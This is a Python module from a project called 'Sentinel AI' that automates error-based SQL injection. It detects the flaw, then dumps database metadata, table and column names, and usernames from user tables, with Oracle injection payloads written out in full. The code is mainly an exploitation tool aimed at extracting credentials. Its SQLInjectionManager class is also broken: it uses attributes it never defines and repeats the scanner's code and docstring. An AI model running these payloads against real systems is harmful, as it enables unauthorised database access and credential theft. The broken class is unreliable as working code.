"""
===========================================================
Project : Sentinel AI
Module  : Error-Based SQL Injection Manager
File ID : SCANNER-ERROR-SQLI-001
Version : 1.0.0
===========================================================

Description:
Error-Based SQL Injection scanner.
Automatically detects and exploits Error-Based SQLi vulnerabilities.
"""

from __future__ import annotations

import logging
from dataclasses import dataclass, field

from app.modules.scanner.modules.error_detector import ErrorDetector
from app.modules.scanner.modules.error_extractor import ErrorExtractor

logger = logging.getLogger(__name__)


@dataclass
class ErrorFinding:
    """Error-Based SQL Injection finding."""

    vulnerable: bool = False
    url: str = ""
    parameter: str = ""
    technique: str = "Error-Based"
    dbms: str = ""
    database: str = ""
    version: str = ""
    user: str = ""
    tables: list[str] = field(default_factory=list)
    columns: dict[str, list[str]] = field(default_factory=dict)
    credentials: list[dict[str, str]] = field(default_factory=list)
    confidence: float = 0.0
    evidence: list[str] = field(default_factory=list)


class ErrorSQLiScanner:
    """
    Error-Based SQL Injection scanner.
    """

    def __init__(self, target: str):
        self.target = target
        self.parameter: str = "category"
        self.findings: list[ErrorFinding] = []
        self.detector: ErrorDetector | None = None
        self.dbms: str | None = None
        self.statistics = {
            "requests": 0,
            "findings": 0,
        }

    def scan(self) -> list[ErrorFinding]:
        """
        Execute Error-Based SQL Injection scan.

        Returns:
            List of ErrorFinding objects
        """
        logger.info(f"[ErrorSQLi] Scanning {self.target} for Error-Based SQLi...")

        self.findings.clear()

        # Step 1: Detect
        self.detector = ErrorDetector(self.target)
        is_vulnerable, dbms = self.detector.detect()

        if not is_vulnerable:
            logger.info("[ErrorSQLi] ❌ Error-Based SQLi not detected")
            return self.findings

        self.dbms = dbms or "Unknown"
        logger.info(f"[ErrorSQLi] ✅ Error-Based SQLi detected (DBMS: {self.dbms})")

        # Step 2: Extract
        extractor = ErrorExtractor(self.target, self.dbms)

        database = extractor.extract_database()
        version = extractor.extract_version()
        user = extractor.extract_user()
        tables = extractor.extract_tables()

        # Extract columns and credentials
        columns = {}
        credentials = []

        for table in tables:
            cols = extractor.extract_columns(table)
            if cols:
                columns[table] = cols

            # Try to extract credentials from user table
            if "user" in table.lower():
                for col in cols:
                    if "user" in col.lower() or "name" in col.lower():
                        data = extractor.extract_data(table, col)
                        for row in data:
                            credentials.append({"username": row})

        # Create finding
        finding = ErrorFinding(
            vulnerable=True,
            url=self.target,
            parameter=self.parameter,
            technique="Error-Based",
            dbms=self.dbms,
            database=database or "",
            version=version or "",
            user=user or "",
            tables=tables,
            columns=columns,
            credentials=credentials,
            confidence=0.95,
            evidence=[
                f"DBMS: {self.dbms}",
                f"Database: {database or 'Unknown'}",
                f"Tables found: {len(tables)}",
                f"Credentials: {len(credentials)}",
            ],
        )
        self.findings.append(finding)
        self.statistics["findings"] = 1

        logger.info(
            f"[ErrorSQLi] ✅ Extracted: Database={database}, Tables={len(tables)}, Credentials={len(credentials)}"
        )

        return self.findings


# ============================================================
# Integration with SQLiManager (Updated)
# ============================================================


class SQLInjectionManager:
    """
    Manages SQL Injection detection and exploitation.
    Automatically switches between UNION, Error-Based, and Blind techniques.
    """

    def __init__(self, target: str):
        self.target = target
        self.union_scanner = None
        self.error_scanner = None
        self.blind_scanner = None
        self.result = None

    def scan(self) -> list[ErrorFinding]:
        """
        Execute Error-Based SQL Injection scan.
        """
        logger.info(f"[ErrorSQLi] Scanning {self.target} for Error-Based SQLi...")

        self.findings.clear()

        # Step 1: Detect
        self.detector = ErrorDetector(self.target)
        is_vulnerable, dbms = self.detector.detect()

        if not is_vulnerable:
            logger.info("[ErrorSQLi] ❌ Error-Based SQLi not detected")
            return self.findings

        self.dbms = dbms or "Unknown"
        logger.info(f"[ErrorSQLi] ✅ Error-Based SQLi detected (DBMS: {self.dbms})")

        # Step 2: Create DBMS-specific extractor
        extractor = ErrorExtractor(self.target, self.dbms)
        logger.info(f"[ErrorSQLi] Using DBMS-specific extractor for: {self.dbms}")

        # Step 3: Extract based on DBMS
        if self.dbms == "Oracle":
            return self._scan_oracle(extractor)
        else:
            return self._scan_standard(extractor)

    def _scan_oracle(self, extractor) -> list[ErrorFinding]:
        """Oracle-specific extraction."""
        logger.info("[ErrorSQLi] Using Oracle-specific extraction...")

        database = extractor.extract_database()
        version = extractor.extract_version()
        user = extractor.extract_user()

        # Use Oracle-specific table extraction
        tables = extractor._extract_oracle_tables(limit=30)

        # Extract columns and credentials
        columns = {}
        credentials = []

        for table in tables:
            if "user" in table.lower():
                # Try to extract column names
                for i in range(10):
                    payload = f"' AND 1=TO_NUMBER((SELECT COLUMN_NAME FROM USER_TAB_COLUMNS WHERE TABLE_NAME='{table}' AND ROWNUM=1 AND COLUMN_NAME NOT IN (SELECT COLUMN_NAME FROM USER_TAB_COLUMNS WHERE TABLE_NAME='{table}' AND ROWNUM<={i})))--"
                    col = extractor._extract_oracle_value(payload)
                    if col:
                        columns.setdefault(table, []).append(col)

                # Try to extract credentials
                for col in columns.get(table, []):
                    if "user" in col.lower() or "name" in col.lower():
                        for i in range(20):
                            payload = f"' AND 1=TO_NUMBER((SELECT {col} FROM {table} WHERE ROWNUM=1 AND {col} NOT IN (SELECT {col} FROM {table} WHERE ROWNUM<={i})))--"
                            value = extractor._extract_oracle_value(payload)
                            if value:
                                credentials.append({"username": value})

        finding = ErrorFinding(
            vulnerable=True,
            url=self.target,
            parameter=self.parameter,
            technique="Error-Based",
            dbms=self.dbms,
            database=database or "",
            version=version or "",
            user=user or "",
            tables=tables,
            columns=columns,
            credentials=credentials,
            confidence=0.95,
            evidence=[
                f"DBMS: {self.dbms}",
                f"Database: {database or 'Unknown'}",
                f"Tables found: {len(tables)}",
                f"Credentials: {len(credentials)}",
            ],
        )
        self.findings.append(finding)
        self.statistics["findings"] = 1

        logger.info(
            f"[ErrorSQLi] ✅ Oracle extraction complete. Tables: {len(tables)}, Credentials: {len(credentials)}"
        )
        return self.findings

    def _scan_standard(self, extractor) -> list[ErrorFinding]:
        """Standard extraction for MySQL, PostgreSQL, MSSQL."""
        database = extractor.extract_database()
        version = extractor.extract_version()
        user = extractor.extract_user()
        tables = extractor.extract_tables()

        columns = {}
        credentials = []

        for table in tables:
            cols = extractor.extract_columns(table)
            if cols:
                columns[table] = cols

            if "user" in table.lower():
                for col in cols:
                    if "user" in col.lower() or "name" in col.lower():
                        data = extractor.extract_data(table, col)
                        for row in data:
                            credentials.append({"username": row})

        finding = ErrorFinding(
            vulnerable=True,
            url=self.target,
            parameter=self.parameter,
            technique="Error-Based",
            dbms=self.dbms,
            database=database or "",
            version=version or "",
            user=user or "",
            tables=tables,
            columns=columns,
            credentials=credentials,
            confidence=0.95,
            evidence=[
                f"DBMS: {self.dbms}",
                f"Database: {database or 'Unknown'}",
                f"Tables found: {len(tables)}",
                f"Credentials: {len(credentials)}",
            ],
        )
        self.findings.append(finding)
        self.statistics["findings"] = 1

        logger.info(
            f"[ErrorSQLi] ✅ Standard extraction complete. Tables: {len(tables)}, Credentials: {len(credentials)}"
        )
        return self.findings
